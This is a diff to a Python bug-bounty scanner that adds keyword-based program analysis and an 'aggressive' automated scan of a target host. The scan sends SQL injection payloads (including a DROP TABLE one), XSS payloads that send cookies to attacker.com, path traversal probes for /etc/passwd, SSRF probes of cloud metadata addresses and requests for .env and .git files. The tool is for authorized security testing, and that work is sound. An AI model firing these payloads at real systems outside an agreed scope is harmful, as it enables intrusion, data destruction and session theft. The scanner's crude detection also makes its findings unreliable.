@@ -618,72 +618,235 @@ async def run_real_hunting_workflow(workflow_id: str, target: str, scope: str, a
         logger.error(f"Workflow error: {e}")
 
 async def ai_analyze_program(program_overview: str, scope: str, bounty_ranges: str = "", focus_areas: str = "") -> Dict:
-    """AI analysis of the bug bounty program"""
+    """AI analysis of the bug bounty program using ALL provided information"""
     try:
-        # Create comprehensive analysis prompt
-        analysis_prompt = f"""
-        BUG BOUNTY PROGRAM ANALYSIS
+        # Parse bounty ranges to understand value priorities
+        bounty_priorities = {}
+        if bounty_ranges:
+            for line in bounty_ranges.split(','):
+                if ':' in line:
+                    severity, amount = line.split(':', 1)
+                    severity = severity.strip().lower()
+                    # Extract numeric values
+                    import re
+                    amounts = re.findall(r'\$?(\d+(?:,\d+)*)', amount)
+                    if amounts:
+                        max_amount = max([int(amt.replace(',', '')) for amt in amounts])
+                        bounty_priorities[severity] = max_amount
         
-        PROGRAM OVERVIEW:
-        {program_overview}
+        # Analyze focus areas to determine attack vectors
+        focus_vectors = []
+        if focus_areas:
+            focus_lower = focus_areas.lower()
+            if 'payment' in focus_lower or 'money' in focus_lower:
+                focus_vectors.extend(['payment_processing', 'financial_transactions', 'billing_systems'])
+            if 'auth' in focus_lower or 'login' in focus_lower:
+                focus_vectors.extend(['authentication_bypass', 'session_management', 'privilege_escalation'])
+            if 'api' in focus_lower:
+                focus_vectors.extend(['api_security', 'endpoint_testing', 'parameter_fuzzing'])
+            if 'data' in focus_lower or 'exposure' in focus_lower:
+                focus_vectors.extend(['information_disclosure', 'data_leakage', 'sensitive_data'])
+            if 'file' in focus_lower or 'upload' in focus_lower:
+                focus_vectors.extend(['file_upload', 'path_traversal', 'file_inclusion'])
+            if 'admin' in focus_lower:
+                focus_vectors.extend(['admin_access', 'admin_panels', 'privileged_functions'])
         
-        SCOPE:
-        {scope}
-        
-        BOUNTY RANGES:
-        {bounty_ranges or "Not specified"}
-        
-        FOCUS AREAS:
-        {focus_areas or "All vulnerabilities"}
-        
-        Based on this information, provide:
-        1. Most valuable vulnerability types to focus on
-        2. Specific attack vectors to test
-        3. High-priority endpoints to target
-        4. Common misconfigurations to look for
-        5. Recommended testing methodology
-        """
-        
-        # For now, simulate AI analysis (replace with actual Gemini API call)
-        analysis_result = {
-            "priority_vulnerabilities": [
-                "SQL Injection",
-                "XSS (Cross-Site Scripting)", 
-                "SSRF (Server-Side Request Forgery)",
-                "Authentication Bypass",
-                "Privilege Escalation"
-            ],
-            "attack_vectors": [
-                "Input validation bypass",
-                "Authentication mechanisms",
-                "API endpoints",
-                "File upload functionality",
-                "Admin panels"
-            ],
-            "high_priority_endpoints": [
-                "/api/",
-                "/admin/",
-                "/login",
-                "/upload",
-                "/search"
-            ],
-            "common_misconfigurations": [
-                "Missing security headers",
-                "CORS misconfiguration",
-                "Information disclosure",
-                "Default credentials",
-                "Debug endpoints"
-            ],
-            "testing_methodology": [
-                "Start with reconnaissance",
-                "Map all endpoints",
-                "Test authentication flows",
-                "Fuzz input parameters",
-                "Check for business logic flaws"
-            ]
+        # Analyze program overview for business context
+        business_context = {
+            'high_value': False,
+            'sensitive_data': [],
+            'critical_functions': [],
+            'technology_stack': []
         }
         
-        logger.info("AI analysis completed")
+        overview_lower = program_overview.lower()
+        if any(word in overview_lower for word in ['bank', 'financial', 'payment', 'money', 'credit']):
+            business_context['high_value'] = True
+            business_context['sensitive_data'].extend(['financial_data', 'payment_info', 'account_details'])
+            business_context['critical_functions'].extend(['money_transfer', 'payment_processing', 'account_management'])
+        
+        if any(word in overview_lower for word in ['health', 'medical', 'patient', 'hipaa']):
+            business_context['high_value'] = True
+            business_context['sensitive_data'].extend(['patient_data', 'medical_records', 'personal_info'])
+            business_context['critical_functions'].extend(['patient_management', 'medical_records', 'appointments'])
+        
+        if any(word in overview_lower for word in ['ecommerce', 'shop', 'store', 'order']):
+            business_context['high_value'] = True
+            business_context['sensitive_data'].extend(['customer_data', 'order_info', 'payment_details'])
+            business_context['critical_functions'].extend(['order_processing', 'inventory_management', 'customer_accounts'])
+        
+        # Technology stack detection
+        if 'react' in overview_lower or 'angular' in overview_lower or 'vue' in overview_lower:
+            business_context['technology_stack'].append('modern_frontend')
+        if 'node' in overview_lower or 'express' in overview_lower:
+            business_context['technology_stack'].append('nodejs_backend')
+        if 'php' in overview_lower:
+            business_context['technology_stack'].append('php_backend')
+        if 'python' in overview_lower or 'django' in overview_lower or 'flask' in overview_lower:
+            business_context['technology_stack'].append('python_backend')
+        if 'java' in overview_lower or 'spring' in overview_lower:
+            business_context['technology_stack'].append('java_backend')
+        
+        # Parse scope for target endpoints
+        scope_targets = []
+        if scope:
+            for target in scope.split(','):
+                target = target.strip()
+                if target.startswith('*.'):
+                    scope_targets.append(f"wildcard_{target[2:]}")
+                elif 'api' in target:
+                    scope_targets.append('api_endpoints')
+                elif 'admin' in target:
+                    scope_targets.append('admin_panels')
+                elif 'mobile' in target:
+                    scope_targets.append('mobile_backend')
+                else:
+                    scope_targets.append('main_application')
+        
+        # Generate comprehensive AI analysis based on ALL inputs
+        analysis_result = {
+            "priority_vulnerabilities": [],
+            "attack_vectors": [],
+            "high_priority_endpoints": [],
+            "common_misconfigurations": [],
+            "testing_methodology": [],
+            "business_context": business_context,
+            "bounty_priorities": bounty_priorities,
+            "focus_vectors": focus_vectors,
+            "scope_targets": scope_targets,
+            "custom_payloads": [],
+            "advanced_techniques": []
+        }
+        
+        # Set priority vulnerabilities based on bounty ranges and business context
+        if bounty_priorities.get('critical', 0) > 5000:
+            analysis_result["priority_vulnerabilities"].extend([
+                "Remote Code Execution (RCE)",
+                "SQL Injection (Blind/Time-based)",
+                "Server-Side Request Forgery (SSRF)",
+                "Authentication Bypass",
+                "Privilege Escalation"
+            ])
+        
+        if bounty_priorities.get('high', 0) > 1000:
+            analysis_result["priority_vulnerabilities"].extend([
+                "SQL Injection",
+                "XSS (Stored/Reflected)",
+                "CSRF",
+                "File Upload Vulnerabilities",
+                "Path Traversal"
+            ])
+        
+        # Add business-specific vulnerabilities
+        if business_context['high_value']:
+            analysis_result["priority_vulnerabilities"].extend([
+                "Business Logic Flaws",
+                "Data Exposure",
+                "Session Hijacking",
+                "API Security Issues"
+            ])
+        
+        # Set attack vectors based on focus areas
+        analysis_result["attack_vectors"] = focus_vectors if focus_vectors else [
+            "Input validation bypass",
+            "Authentication mechanisms",
+            "API endpoints",
+            "File upload functionality",
+            "Admin panels",
+            "Business logic testing",
+            "Session management",
+            "Parameter manipulation"
+        ]
+        
+        # Set high-priority endpoints based on scope and business context
+        base_endpoints = ["/api/", "/admin/", "/login", "/upload", "/search", "/user/", "/account/"]
+        
+        if 'api_endpoints' in scope_targets:
+            analysis_result["high_priority_endpoints"].extend([
+                "/api/v1/", "/api/v2/", "/api/users/", "/api/admin/", "/api/payment/",
+                "/api/orders/", "/api/account/", "/api/data/", "/api/config/"
+            ])
+        
+        if 'admin_panels' in scope_targets:
+            analysis_result["high_priority_endpoints"].extend([
+                "/admin/", "/admin/dashboard", "/admin/users", "/admin/settings",
+                "/admin/panel", "/admin/config", "/admin/system", "/admin/data"
+            ])
+        
+        if business_context['critical_functions']:
+            for func in business_context['critical_functions']:
+                if 'payment' in func:
+                    analysis_result["high_priority_endpoints"].extend([
+                        "/payment/", "/checkout/", "/billing/", "/transactions/",
+                        "/process-payment", "/payment-gateway", "/stripe/", "/paypal/"
+                    ])
+                elif 'account' in func:
+                    analysis_result["high_priority_endpoints"].extend([
+                        "/account/", "/profile/", "/settings/", "/preferences/",
+                        "/security/", "/password/", "/2fa/", "/verification/"
+                    ])
+        
+        analysis_result["high_priority_endpoints"].extend(base_endpoints)
+        
+        # Set misconfigurations based on technology stack
+        if 'modern_frontend' in business_context['technology_stack']:
+            analysis_result["common_misconfigurations"].extend([
+                "CORS misconfiguration",
+                "JWT token exposure",
+                "Client-side security issues"
+            ])
+        
+        if 'nodejs_backend' in business_context['technology_stack']:
+            analysis_result["common_misconfigurations"].extend([
+                "Express.js security misconfigurations",
+                "NPM package vulnerabilities",
+                "Node.js security headers"
+            ])
+        
+        analysis_result["common_misconfigurations"].extend([
+            "Missing security headers",
+            "Information disclosure",
+            "Default credentials",
+            "Debug endpoints",
+            "Error handling exposure",
+            "Directory listing",
+            "Backup files exposure"
+        ])
+        
+        # Set testing methodology based on business context
+        analysis_result["testing_methodology"] = [
+            "Comprehensive reconnaissance",
+            "Endpoint mapping and discovery",
+            "Authentication flow testing",
+            "Business logic validation",
+            "Input parameter fuzzing",
+            "Session management testing",
+            "API security assessment",
+            "File upload testing",
+            "Admin panel discovery",
+            "Data exposure testing"
+        ]
+        
+        # Generate custom payloads based on business context
+        if business_context['high_value']:
+            analysis_result["custom_payloads"] = [
+                "Business logic bypass payloads",
+                "Authentication bypass techniques",
+                "Privilege escalation methods",
+                "Data extraction payloads"
+            ]
+        
+        # Set advanced techniques based on bounty value
+        if max(bounty_priorities.values()) if bounty_priorities else 0 > 5000:
+            analysis_result["advanced_techniques"] = [
+                "Chain multiple vulnerabilities",
+                "Time-based blind attacks",
+                "Advanced SQL injection",
+                "Complex business logic flaws",
+                "API abuse techniques"
+            ]
+        
+        logger.info(f"AI analysis completed with {len(analysis_result['priority_vulnerabilities'])} priority vulnerabilities")
         return analysis_result
         
     except Exception as e:
@@ -691,137 +854,380 @@ async def ai_analyze_program(program_overview: str, scope: str, bounty_ranges: s
         return {"error": str(e)}
 
 async def ai_guided_vulnerability_scan(target: str, ai_analysis: Dict, ports: Dict[int, str]) -> List[Dict]:
-    """AI-guided vulnerability scanning based on program analysis"""
+    """AI-guided vulnerability scanning using ALL analyzed information for maximum bounty potential"""
     vulnerabilities = []
     
     try:
-        # Get AI recommendations
+        # Get comprehensive AI analysis
         priority_vulns = ai_analysis.get("priority_vulnerabilities", [])
         attack_vectors = ai_analysis.get("attack_vectors", [])
         high_priority_endpoints = ai_analysis.get("high_priority_endpoints", [])
+        business_context = ai_analysis.get("business_context", {})
+        bounty_priorities = ai_analysis.get("bounty_priorities", {})
+        focus_vectors = ai_analysis.get("focus_vectors", [])
+        custom_payloads = ai_analysis.get("custom_payloads", [])
+        advanced_techniques = ai_analysis.get("advanced_techniques", [])
         
         if 80 in ports or 443 in ports:
             protocol = "https" if 443 in ports else "http"
             base_url = f"{protocol}://{target}"
             
-            # AI-guided vulnerability tests
+            # AGGRESSIVE AI-GUIDED VULNERABILITY TESTS
             ai_vuln_tests = []
             
-            # SQL Injection tests based on AI analysis
-            if "SQL Injection" in priority_vulns:
+            # 1. COMPREHENSIVE SQL INJECTION TESTING
+            if any("sql" in vuln.lower() for vuln in priority_vulns):
                 sql_payloads = [
+                    # Basic SQL injection
                     "' OR 1=1--",
-                    "' UNION SELECT NULL--",
-                    "'; DROP TABLE users--",
                     "' OR '1'='1",
-                    "admin'--"
+                    "admin'--",
+                    "admin'/*",
+                    "' UNION SELECT NULL--",
+                    "' UNION SELECT NULL,NULL--",
+                    "' UNION SELECT NULL,NULL,NULL--",
+                    
+                    # Advanced SQL injection
+                    "'; DROP TABLE users--",
+                    "' OR 1=1 LIMIT 1--",
+                    "' OR 1=1 ORDER BY 1--",
+                    "' OR 1=1 ORDER BY 2--",
+                    "' OR 1=1 ORDER BY 3--",
+                    
+                    # Time-based blind SQL injection
+                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+                    
+                    # Boolean-based blind SQL injection
+                    "' AND 1=1--",
+                    "' AND 1=2--",
+                    "' AND (SELECT COUNT(*) FROM users)>0--",
+                    
+                    # Error-based SQL injection
+                    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
+                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--"
                 ]
-                for payload in sql_payloads:
-                    ai_vuln_tests.append({
-                        "type": "SQL Injection",
-                        "url": f"{base_url}/search?q={payload}",
-                        "payload": payload,
-                        "severity": "High"
-                    })
-                    ai_vuln_tests.append({
-                        "type": "SQL Injection", 
-                        "url": f"{base_url}/login?username={payload}&password=test",
-                        "payload": payload,
-                        "severity": "High"
-                    })
+                
+                # Test SQL injection on all high-priority endpoints
+                for endpoint in high_priority_endpoints:
+                    for payload in sql_payloads:
+                        ai_vuln_tests.extend([
+                            {
+                                "type": "SQL Injection",
+                                "url": f"{base_url}{endpoint}?id={payload}",
+                                "payload": payload,
+                                "severity": "High",
+                                "endpoint": endpoint
+                            },
+                            {
+                                "type": "SQL Injection",
+                                "url": f"{base_url}{endpoint}?user={payload}",
+                                "payload": payload,
+                                "severity": "High",
+                                "endpoint": endpoint
+                            },
+                            {
+                                "type": "SQL Injection",
+                                "url": f"{base_url}{endpoint}?search={payload}",
+                                "payload": payload,
+                                "severity": "High",
+                                "endpoint": endpoint
+                            }
+                        ])
             
-            # XSS tests based on AI analysis
-            if "XSS" in priority_vulns:
+            # 2. COMPREHENSIVE XSS TESTING
+            if any("xss" in vuln.lower() for vuln in priority_vulns):
                 xss_payloads = [
+                    # Basic XSS
                     "<script>alert('XSS')</script>",
                     "<img src=x onerror=alert('XSS')>",
-                    "javascript:alert('XSS')",
                     "<svg onload=alert('XSS')>",
-                    "'\"><script>alert('XSS')</script>"
+                    "javascript:alert('XSS')",
+                    
+                    # Advanced XSS
+                    "'\"><script>alert('XSS')</script>",
+                    "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
+                    "<img src=x onerror=fetch('http://attacker.com?cookie='+document.cookie)>",
+                    
+                    # DOM XSS
+                    "#<script>alert('XSS')</script>",
+                    "javascript:alert(document.cookie)",
+                    
+                    # Filter bypass XSS
+                    "<ScRiPt>alert('XSS')</ScRiPt>",
+                    "<script>alert(String.fromCharCode(88,83,83))</script>",
+                    "<img src=x onerror=alert(1)>",
+                    "<svg><script>alert(1)</script></svg>"
                 ]
-                for payload in xss_payloads:
+                
+                for endpoint in high_priority_endpoints:
+                    for payload in xss_payloads:
+                        ai_vuln_tests.append({
+                            "type": "XSS",
+                            "url": f"{base_url}{endpoint}?q={payload}",
+                            "payload": payload,
+                            "severity": "Medium",
+                            "endpoint": endpoint
+                        })
+            
+            # 3. BUSINESS LOGIC VULNERABILITIES (High Value)
+            if business_context.get('high_value'):
+                business_logic_tests = [
+                    # Authentication bypass
+                    f"{base_url}/admin",
+                    f"{base_url}/admin/",
+                    f"{base_url}/admin.php",
+                    f"{base_url}/admin.html",
+                    f"{base_url}/admin/dashboard",
+                    f"{base_url}/admin/users",
+                    f"{base_url}/admin/settings",
+                    
+                    # Payment processing bypass
+                    f"{base_url}/payment/",
+                    f"{base_url}/checkout/",
+                    f"{base_url}/billing/",
+                    f"{base_url}/transactions/",
+                    
+                    # Account takeover attempts
+                    f"{base_url}/account/",
+                    f"{base_url}/profile/",
+                    f"{base_url}/settings/",
+                    f"{base_url}/password/",
+                    f"{base_url}/2fa/",
+                    
+                    # API endpoints
+                    f"{base_url}/api/",
+                    f"{base_url}/api/v1/",
+                    f"{base_url}/api/users/",
+                    f"{base_url}/api/admin/",
+                    f"{base_url}/api/payment/",
+                    f"{base_url}/api/orders/"
+                ]
+                
+                for test_url in business_logic_tests:
                     ai_vuln_tests.append({
-                        "type": "XSS",
-                        "url": f"{base_url}/search?q={payload}",
-                        "payload": payload,
-                        "severity": "Medium"
+                        "type": "Business Logic Test",
+                        "url": test_url,
+                        "payload": "N/A",
+                        "severity": "High",
+                        "endpoint": "Business Critical"
                     })
             
-            # Test high-priority endpoints from AI analysis
+            # 4. FILE UPLOAD VULNERABILITIES
+            if any("file" in vector.lower() for vector in focus_vectors):
+                file_upload_endpoints = [
+                    "/upload/", "/file/", "/media/", "/images/", "/files/",
+                    "/admin/upload", "/api/upload", "/user/upload"
+                ]
+                
+                for endpoint in file_upload_endpoints:
+                    ai_vuln_tests.append({
+                        "type": "File Upload Test",
+                        "url": f"{base_url}{endpoint}",
+                        "payload": "File upload functionality",
+                        "severity": "Medium",
+                        "endpoint": endpoint
+                    })
+            
+            # 5. PATH TRAVERSAL
+            path_traversal_payloads = [
+                "../../../etc/passwd",
+                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+                "....//....//....//etc/passwd",
+                "..%2F..%2F..%2Fetc%2Fpasswd",
+                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+            ]
+            
             for endpoint in high_priority_endpoints:
+                for payload in path_traversal_payloads:
+                    ai_vuln_tests.append({
+                        "type": "Path Traversal",
+                        "url": f"{base_url}{endpoint}?file={payload}",
+                        "payload": payload,
+                        "severity": "High",
+                        "endpoint": endpoint
+                    })
+            
+            # 6. SSRF TESTING
+            if any("ssrf" in vuln.lower() for vuln in priority_vulns):
+                ssrf_payloads = [
+                    "http://127.0.0.1/",
+                    "http://localhost/",
+                    "http://169.254.169.254/",  # AWS metadata
+                    "http://169.254.169.254/latest/meta-data/",
+                    "http://metadata.google.internal/",
+                    "http://169.254.169.254/metadata/v1/",  # DigitalOcean
+                    "http://100.100.100.200/",  # Alibaba Cloud
+                ]
+                
+                for endpoint in high_priority_endpoints:
+                    for payload in ssrf_payloads:
+                        ai_vuln_tests.append({
+                            "type": "SSRF",
+                            "url": f"{base_url}{endpoint}?url={payload}",
+                            "payload": payload,
+                            "severity": "High",
+                            "endpoint": endpoint
+                        })
+            
+            # 7. INFORMATION DISCLOSURE
+            info_disclosure_tests = [
+                f"{base_url}/.git/config",
+                f"{base_url}/.env",
+                f"{base_url}/config.php",
+                f"{base_url}/wp-config.php",
+                f"{base_url}/config.json",
+                f"{base_url}/.htaccess",
+                f"{base_url}/robots.txt",
+                f"{base_url}/sitemap.xml",
+                f"{base_url}/backup/",
+                f"{base_url}/backup.zip",
+                f"{base_url}/backup.sql",
+                f"{base_url}/debug/",
+                f"{base_url}/test/",
+                f"{base_url}/dev/",
+                f"{base_url}/staging/",
+                f"{base_url}/admin/backup/",
+                f"{base_url}/api/docs/",
+                f"{base_url}/swagger/",
+                f"{base_url}/api/swagger.json"
+            ]
+            
+            for test_url in info_disclosure_tests:
                 ai_vuln_tests.append({
-                    "type": "Endpoint Discovery",
-                    "url": f"{base_url}{endpoint}",
+                    "type": "Information Disclosure",
+                    "url": test_url,
                     "payload": "N/A",
-                    "severity": "Info"
+                    "severity": "Medium",
+                    "endpoint": "Sensitive Files"
                 })
             
-            # Execute AI-guided tests
-            for test in ai_vuln_tests:
+            # 8. CSRF TESTING
+            csrf_endpoints = [
+                "/admin/users/delete",
+                "/admin/settings/update",
+                "/account/password/change",
+                "/payment/process",
+                "/api/users/update",
+                "/api/admin/delete"
+            ]
+            
+            for endpoint in csrf_endpoints:
+                ai_vuln_tests.append({
+                    "type": "CSRF Test",
+                    "url": f"{base_url}{endpoint}",
+                    "payload": "CSRF protection check",
+                    "severity": "Medium",
+                    "endpoint": endpoint
+                })
+            
+            # EXECUTE ALL AI-GUIDED TESTS
+            logger.info(f"Executing {len(ai_vuln_tests)} AI-guided vulnerability tests...")
+            
+            for i, test in enumerate(ai_vuln_tests):
                 try:
-                    response = requests.get(test["url"], timeout=5, allow_redirects=False)
+                    response = requests.get(test["url"], timeout=10, allow_redirects=False, 
+                                          headers={'User-Agent': 'Kai-AI-Hunter/1.0'})
                     
                     # Analyze response based on test type
                     if test["type"] == "SQL Injection":
-                        if any(error in response.text.lower() for error in ["sql", "mysql", "oracle", "postgresql", "syntax error"]):
+                        if any(error in response.text.lower() for error in [
+                            "sql", "mysql", "oracle", "postgresql", "sqlite", "syntax error", 
+                            "mysql_fetch_array", "mysql_num_rows", "mysql_fetch_assoc",
+                            "ora-", "postgresql", "sql server", "microsoft ole db"
+                        ]):
                             vulnerabilities.append({
                                 "type": "SQL Injection",
                                 "url": test["url"],
                                 "severity": "High",
-                                "description": f"Potential SQL injection with payload: {test['payload']}",
-                                "evidence": response.text[:200],
-                                "ai_guided": True
+                                "description": f"SQL injection vulnerability with payload: {test['payload']}",
+                                "evidence": response.text[:300],
+                                "ai_guided": True,
+                                "endpoint": test.get("endpoint", "Unknown"),
+                                "bounty_potential": bounty_priorities.get("high", 1000)
                             })
                     
                     elif test["type"] == "XSS":
-                        if test["payload"] in response.text:
+                        if test["payload"] in response.text or "alert" in response.text:
                             vulnerabilities.append({
                                 "type": "XSS",
                                 "url": test["url"],
                                 "severity": "Medium",
                                 "description": f"Potential XSS with payload: {test['payload']}",
-                                "evidence": response.text[:200],
-                                "ai_guided": True
+                                "evidence": response.text[:300],
+                                "ai_guided": True,
+                                "endpoint": test.get("endpoint", "Unknown"),
+                                "bounty_potential": bounty_priorities.get("medium", 500)
                             })
                     
-                    elif test["type"] == "Endpoint Discovery":
-                        if response.status_code != 404:
+                    elif test["type"] == "Business Logic Test":
+                        if response.status_code == 200 and any(keyword in response.text.lower() for keyword in [
+                            "admin", "dashboard", "panel", "settings", "users", "payment", "billing"
+                        ]):
                             vulnerabilities.append({
-                                "type": "Endpoint Found",
+                                "type": "Potential Auth Bypass",
                                 "url": test["url"],
-                                "severity": "Info",
-                                "description": f"Discovered endpoint: {test['url']} (Status: {response.status_code})",
-                                "evidence": f"Status code: {response.status_code}",
-                                "ai_guided": True
+                                "severity": "High",
+                                "description": f"Admin panel or sensitive endpoint accessible without authentication",
+                                "evidence": f"Status: {response.status_code}, Content length: {len(response.text)}",
+                                "ai_guided": True,
+                                "endpoint": test.get("endpoint", "Unknown"),
+                                "bounty_potential": bounty_priorities.get("critical", 5000)
                             })
+                    
+                    elif test["type"] == "Path Traversal":
+                        if any(indicator in response.text.lower() for indicator in [
+                            "root:", "bin:", "daemon:", "sys:", "adm:", "mysql:", "apache:",
+                            "windows", "system32", "drivers", "hosts", "passwd", "shadow"
+                        ]):
+                            vulnerabilities.append({
+                                "type": "Path Traversal",
+                                "url": test["url"],
+                                "severity": "High",
+                                "description": f"Path traversal vulnerability with payload: {test['payload']}",
+                                "evidence": response.text[:300],
+                                "ai_guided": True,
+                                "endpoint": test.get("endpoint", "Unknown"),
+                                "bounty_potential": bounty_priorities.get("high", 1000)
+                            })
+                    
+                    elif test["type"] == "Information Disclosure":
+                        if response.status_code == 200 and len(response.text) > 0:
+                            if any(indicator in response.text.lower() for indicator in [
+                                "database", "password", "secret", "key", "token", "api_key",
+                                "config", "environment", "debug", "error", "stack trace"
+                            ]):
+                                vulnerabilities.append({
+                                    "type": "Information Disclosure",
+                                    "url": test["url"],
+                                    "severity": "Medium",
+                                    "description": f"Sensitive information exposed at {test['url']}",
+                                    "evidence": response.text[:300],
+                                    "ai_guided": True,
+                                    "endpoint": test.get("endpoint", "Unknown"),
+                                    "bounty_potential": bounty_priorities.get("medium", 500)
+                                })
+                    
+                    elif test["type"] == "SSRF":
+                        if response.status_code != 404 and response.status_code != 403:
+                            vulnerabilities.append({
+                                "type": "Potential SSRF",
+                                "url": test["url"],
+                                "severity": "High",
+                                "description": f"Potential SSRF with payload: {test['payload']}",
+                                "evidence": f"Status: {response.status_code}",
+                                "ai_guided": True,
+                                "endpoint": test.get("endpoint", "Unknown"),
+                                "bounty_potential": bounty_priorities.get("high", 1000)
+                            })
+                    
+                    # Progress update every 50 tests
+                    if (i + 1) % 50 == 0:
+                        logger.info(f"Completed {i + 1}/{len(ai_vuln_tests)} AI-guided tests...")
                 
                 except Exception as e:
                     logger.error(f"AI test error for {test['type']}: {e}")
-        
-        # Check for business logic vulnerabilities based on AI analysis
-        if "Authentication Bypass" in priority_vulns:
-            auth_bypass_tests = [
-                f"{base_url}/admin",
-                f"{base_url}/admin/",
-                f"{base_url}/admin.php",
-                f"{base_url}/admin.html",
-                f"{base_url}/admin/dashboard"
-            ]
-            
-            for test_url in auth_bypass_tests:
-                try:
-                    response = requests.get(test_url, timeout=5)
-                    if response.status_code == 200 and "admin" in response.text.lower():
-                        vulnerabilities.append({
-                            "type": "Potential Auth Bypass",
-                            "url": test_url,
-                            "severity": "High",
-                            "description": f"Admin panel accessible without authentication",
-                            "evidence": "Admin panel accessible",
-                            "ai_guided": True
-                        })
-                except:
-                    pass
+                    continue
         
         logger.info(f"AI-guided scan completed. Found {len(vulnerabilities)} AI-guided vulnerabilities")
         return vulnerabilities
